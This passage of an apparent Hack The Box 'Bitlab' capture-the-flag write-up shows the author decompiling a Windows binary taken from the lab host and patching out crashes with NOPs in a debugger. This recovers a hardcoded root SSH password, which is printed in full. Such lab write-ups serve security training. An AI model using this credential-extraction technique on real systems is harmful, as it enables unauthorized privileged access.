-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
-r-------- 1 clave clave    33 Feb 28  2019 user.txt
clave@bitlab:~$ 
</code></pre></div></div>
<p>I downloaded it on my box:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/bitlab# scp clave@bitlab.htb:/home/clave/RemoteConnection.exe ./
clave@bitlab.htb's password: 
RemoteConnection.exe                                                                                                                                                                                     100%   14KB  16.5KB/s   00:00    
root@kali:~/Desktop/HTB/boxes/bitlab#
</code></pre></div></div>
<p>Then I started looking at the code decompilation with <code class="language-plaintext highlighter-rouge">Ghidra</code>. One function that caught my attention was <code class="language-plaintext highlighter-rouge">FUN_00401520()</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cm">/* WARNING: Could not reconcile some variable overlaps */</span>

<span class="kt">void</span> <span class="nf">FUN_00401520</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">LPCWSTR</span> <span class="n">pWVar1</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="o">***</span><span class="n">pppuVar2</span><span class="p">;</span>
  <span class="n">LPCWSTR</span> <span class="n">lpParameters</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="o">***</span><span class="n">pppuVar3</span><span class="p">;</span>
  <span class="kt">int</span> <span class="o">**</span><span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">in_stack_ffffff44</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="o">*</span><span class="n">puVar4</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">uStack132</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="o">*</span><span class="n">local_74</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="o">*</span><span class="n">local_70</span><span class="p">;</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">local_6c</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">local_68</span> <span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="n">undefined4</span> <span class="n">local_58</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">local_54</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">local_4c</span> <span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="n">undefined4</span> <span class="n">local_3c</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">local_38</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="o">***</span><span class="n">local_30</span> <span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="kt">int</span> <span class="n">local_20</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">local_1c</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">local_14</span><span class="p">;</span>
  <span class="kt">int</span> <span class="o">*</span><span class="n">local_10</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="o">*</span><span class="n">puStack12</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="n">local_8</span><span class="p">;</span>
  
  <span class="n">local_8</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
  <span class="n">puStack12</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">LAB_004028e0</span><span class="p">;</span>
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="n">uStack132</span> <span class="o">=</span> <span class="n">DAT_00404018</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">***</span><span class="p">)</span><span class="n">in_FS_OFFSET</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">local_10</span><span class="p">;</span>
  <span class="n">local_6c</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4</span><span class="p">;</span>
  <span class="n">local_14</span> <span class="o">=</span> <span class="n">uStack132</span><span class="p">;</span>
  <span class="n">GetUserNameW</span><span class="p">((</span><span class="n">LPWSTR</span><span class="p">)</span><span class="mh">0x4</span><span class="p">,(</span><span class="n">LPDWORD</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_6c</span><span class="p">);</span>
  <span class="n">local_38</span> <span class="o">=</span> <span class="mh">0xf</span><span class="p">;</span>
  <span class="n">local_3c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_4c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="n">uint</span><span class="p">)</span><span class="n">local_4c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffffff00</span><span class="p">);</span>
  <span class="n">FUN_004018f0</span><span class="p">();</span>
  <span class="n">local_8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">FUN_00401260</span><span class="p">(</span><span class="n">local_68</span><span class="p">,</span><span class="n">local_4c</span><span class="p">);</span>
  <span class="n">local_74</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stack0xffffff60</span><span class="p">;</span>
  <span class="n">local_8</span><span class="p">.</span><span class="n">_0_1_</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">FUN_004018f0</span><span class="p">();</span>
  <span class="n">local_70</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stack0xffffff44</span><span class="p">;</span>
  <span class="n">local_8</span><span class="p">.</span><span class="n">_0_1_</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
  <span class="n">puVar4</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_stack_ffffff44</span> <span class="o">&amp;</span> <span class="mh">0xffffff00</span><span class="p">);</span>
  <span class="n">FUN_00401710</span><span class="p">(</span><span class="n">local_68</span><span class="p">);</span>
  <span class="n">local_8</span><span class="p">.</span><span class="n">_0_1_</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">FUN_00401040</span><span class="p">(</span><span class="n">puVar4</span><span class="p">);</span>
  <span class="n">local_8</span> <span class="o">=</span> <span class="n">CONCAT31</span><span class="p">(</span><span class="n">local_8</span><span class="p">.</span><span class="n">_1_3_</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
  <span class="n">lpParameters</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="n">FUN_00401e6d</span><span class="p">();</span>
  <span class="n">pppuVar3</span> <span class="o">=</span> <span class="n">local_30</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_1c</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">pppuVar3</span> <span class="o">=</span> <span class="n">local_30</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">pWVar1</span> <span class="o">=</span> <span class="n">lpParameters</span><span class="p">;</span>
  <span class="n">pppuVar2</span> <span class="o">=</span> <span class="n">local_30</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_1c</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">pppuVar2</span> <span class="o">=</span> <span class="n">local_30</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">pppuVar2</span> <span class="o">!=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">***</span><span class="p">)(</span><span class="n">local_20</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">pppuVar3</span><span class="p">))</span> <span class="p">{</span>
    <span class="o">*</span><span class="n">pWVar1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">pppuVar2</span><span class="p">;</span>
    <span class="n">pWVar1</span> <span class="o">=</span> <span class="n">pWVar1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">pppuVar2</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">***</span><span class="p">)((</span><span class="kt">int</span><span class="p">)</span><span class="n">pppuVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">lpParameters</span><span class="p">[</span><span class="n">local_20</span><span class="p">]</span> <span class="o">=</span> <span class="sc">L'\0'</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_6c</span> <span class="o">==</span> <span class="s">L"clave"</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ShellExecuteW</span><span class="p">((</span><span class="n">HWND</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="s">L"open"</span><span class="p">,</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Program Files</span><span class="se">\\</span><span class="s">PuTTY</span><span class="se">\\</span><span class="s">putty.exe"</span><span class="p">,</span><span class="n">lpParameters</span><span class="p">,(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="mh">0x0</span>
                  <span class="p">,</span><span class="mi">10</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">FUN_00401c20</span><span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">cout_exref</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">local_1c</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">operator_delete</span><span class="p">(</span><span class="n">local_30</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="n">local_1c</span> <span class="o">=</span> <span class="mh">0xf</span><span class="p">;</span>
  <span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_30</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">***</span><span class="p">)((</span><span class="n">uint</span><span class="p">)</span><span class="n">local_30</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffffff00</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">local_54</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">operator_delete</span><span class="p">(</span><span class="n">local_68</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="n">local_54</span> <span class="o">=</span> <span class="mh">0xf</span><span class="p">;</span>
  <span class="n">local_58</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_68</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="n">uint</span><span class="p">)</span><span class="n">local_68</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffffff00</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">local_38</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">operator_delete</span><span class="p">(</span><span class="n">local_4c</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="o">*</span><span class="n">in_FS_OFFSET</span> <span class="o">=</span> <span class="n">local_10</span><span class="p">;</span>
  <span class="n">FUN_00401e78</span><span class="p">();</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>It looked like it was checking if the name of the user running the program was clave, then It executed <code class="language-plaintext highlighter-rouge">PuTTY</code> with some parameters that I couldn’t see:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">local_6c</span> <span class="o">==</span> <span class="s">L"clave"</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ShellExecuteW</span><span class="p">((</span><span class="n">HWND</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="s">L"open"</span><span class="p">,</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Program Files</span><span class="se">\\</span><span class="s">PuTTY</span><span class="se">\\</span><span class="s">putty.exe"</span><span class="p">,</span><span class="n">lpParameters</span><span class="p">,(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="mh">0x0</span>
                  <span class="p">,</span><span class="mi">10</span><span class="p">);</span>
  <span class="p">}</span>
</code></pre></div></div>
<p>This is how the same part looked like in <code class="language-plaintext highlighter-rouge">IDA</code>:
<br><img src="/images/hackthebox/bitlab/20.png" alt="" class="align-center"><br><br>
I copied the executable to a Windows machine and I tried to run it, however it just kept crashing.<br>
I opened it in <code class="language-plaintext highlighter-rouge">immunity debugger</code> to find out what was happening, and I found an access violation:
<br><img src="/images/hackthebox/bitlab/21.png" alt="" class="align-center"><br><br>
It happened before reaching the function I’m interested in so I had to fix it. What I did was simply replacing the instructions that caused that access violation with <code class="language-plaintext highlighter-rouge">NOP</code>s.<br>
I had to set a breakpoint before the <code class="language-plaintext highlighter-rouge">cmp</code> instruction, so I searched for the word “clave” in the referenced text strings and I followed it in the disassembler:
<br><img src="/images/hackthebox/bitlab/22.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/23.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/24.png" alt="" class="align-center"><br><br>
Then I executed the program and whenever I hit an access violation I replaced the instructions with <code class="language-plaintext highlighter-rouge">NOP</code>s, it happened twice then I reached my breakpoint:
<br><img src="/images/hackthebox/bitlab/25.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/26.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/27.png" alt="" class="align-center"><br><br></p>

<p>After reaching the breakpoint I could see the parameters that the program gives to <code class="language-plaintext highlighter-rouge">putty.exe</code> in both <code class="language-plaintext highlighter-rouge">eax</code> and <code class="language-plaintext highlighter-rouge">ebx</code>, It was starting an <code class="language-plaintext highlighter-rouge">ssh</code> session as root and I could see the password:
<br><img src="/images/hackthebox/bitlab/28.png" alt="" class="align-center"><br><br></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EAX 00993E80 UNICODE "-ssh root@gitlab.htb -pw "Qf7]8YSV.wDNF*[7d?j&amp;eD4^""
EBX 00993DA0 ASCII "-ssh root@gitlab.htb -pw "Qf7]8YSV.wDNF*[7d?j&amp;eD4^""
</code></pre></div></div>

<p><br><img src="/images/hackthebox/bitlab/29.png" alt="" class="align-center"><br><br>
And we owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/craft/">Hack The Box - Craft</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/player/">Hack The Box - Player</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-01-11T07:00:00+02:00">January 11, 2020</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/craft/" class="pagination--pager" title="Hack The Box - Craft
">Previous</a>
    
    
      <a href="/hack-the-box/player/" class="pagination--pager" title="Hack The Box - Player
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
